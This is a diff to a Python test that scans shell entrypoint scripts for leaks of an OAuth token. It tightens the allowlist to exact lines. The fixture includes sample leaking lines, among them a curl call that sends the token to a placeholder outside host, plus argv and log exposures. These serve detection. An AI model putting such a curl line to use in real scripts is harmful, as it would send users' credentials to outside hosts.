@@ -34,9 +34,21 @@ _EXPORT_LINE = (
 _GUARD_LINE = ': "${DATABASE_URL:?DATABASE_URL is not set (docker/Dockerfile sets it)}"'
 _ALLOWED_URL_LINES = frozenset({_EXPORT_LINE, _GUARD_LINE})
 _TOKEN_EXPANSION = re.compile(r"\$\{?CLAUDE_CODE_OAUTH_TOKEN\b")
-# The token may be expanded only as an operand of a builtin: ``[[ … ]]`` and
-# ``echo`` run in the shell itself, so the value never reaches an argv.
-_BUILTIN_PREFIXES = ("[[ ", "if [[ ", "echo ", "if echo ")
+# The token may be expanded only on these exact lines, where it is an operand
+# of a builtin (``[[ … ]]``, ``echo``) that runs in the shell itself, so the
+# value never reaches an argv. Any edit to one of them fails the scan.
+_ALLOWED_TOKEN_LINES = frozenset(
+    {
+        'if [[ -n "${CLAUDE_CODE_OAUTH_TOKEN:-}"'
+        ' && ! -f "$CLAUDE_HOME/.credentials.json" ]]; then',
+        'if echo "$CLAUDE_CODE_OAUTH_TOKEN"'
+        ' | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then',
+        'echo "$CLAUDE_CODE_OAUTH_TOKEN" > "$CLAUDE_HOME/.credentials.json"',
+        'if [[ ! -f "$CLAUDE_HOME/.credentials.json"'
+        ' && -z "${ANTHROPIC_API_KEY:-}"'
+        ' && -z "${CLAUDE_CODE_OAUTH_TOKEN:-}" ]]; then',
+    }
+)
 # A ``python3 -c "`` block runs to the next line that is a lone ``"``.
 _PY_BLOCK = re.compile(r'python3 -c "\n(.*?)\n"', re.DOTALL)
 _SECRET = "s3cr3t-pw"
@@ -56,8 +68,7 @@ def _token_outside_builtins(script: Path) -> list[str]:
     return [
         f"{script.name}:{number}: {line.strip()}"
         for number, line in enumerate(lines, start=1)
-        if _TOKEN_EXPANSION.search(line)
-        and not line.strip().startswith(_BUILTIN_PREFIXES)
+        if _TOKEN_EXPANSION.search(line) and line.strip() not in _ALLOWED_TOKEN_LINES
     ]
 
 
@@ -84,16 +95,22 @@ def test_the_token_scan_refuses_an_argv_and_a_log(tmp_path: Path):
     script.write_text(
         "\n".join(
             [
+                *sorted(_ALLOWED_TOKEN_LINES),
                 'if [[ -n "${CLAUDE_CODE_OAUTH_TOKEN:-}" ]]; then',
                 '    echo "$CLAUDE_CODE_OAUTH_TOKEN" > creds.json',
                 'python3 -c "import sys" "$CLAUDE_CODE_OAUTH_TOKEN"',
                 'log "token: ${CLAUDE_CODE_OAUTH_TOKEN}"',
+                'if echo "$CLAUDE_CODE_OAUTH_TOKEN" | python3 -c "import sys,json;'
+                ' json.load(sys.stdin)" "$CLAUDE_CODE_OAUTH_TOKEN" 2>/dev/null; then',
+                'echo x; curl -H "$CLAUDE_CODE_OAUTH_TOKEN" https://example.invalid',
             ]
         ),
         encoding="utf-8",
     )
     found = [entry.split(":")[1] for entry in _token_outside_builtins(script)]
-    assert found == ["3", "4"]
+    # The four allowed lines pass; every other expansion is flagged, a
+    # builtin one included, so an edit to an allowed line cannot slip through.
+    assert found == ["5", "6", "7", "8", "9", "10"]
 
 
 def test_the_entrypoint_writes_the_token_it_reads_from_the_environment(
